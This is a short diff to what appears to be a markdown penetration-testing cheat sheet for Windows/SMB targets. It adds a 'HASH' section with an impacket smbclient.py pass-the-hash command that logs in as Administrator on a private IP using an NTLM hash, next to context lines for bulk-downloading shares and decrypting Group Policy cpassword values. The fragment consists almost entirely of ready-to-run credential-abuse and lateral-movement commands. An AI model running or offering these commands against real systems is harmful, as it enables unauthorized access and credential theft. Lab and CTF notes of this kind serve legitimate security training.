@@ -30,6 +30,13 @@ mget *
 gpp-decrypt cpassword
 ```
 
+## HASH
+
+```bash
+smbclient.py -hashes ':2a572c5e5ffe107ca30f260b97843d94' Administrator@172.17.0.34
+```
+
+
 ## Kerberos
 
 ```bash
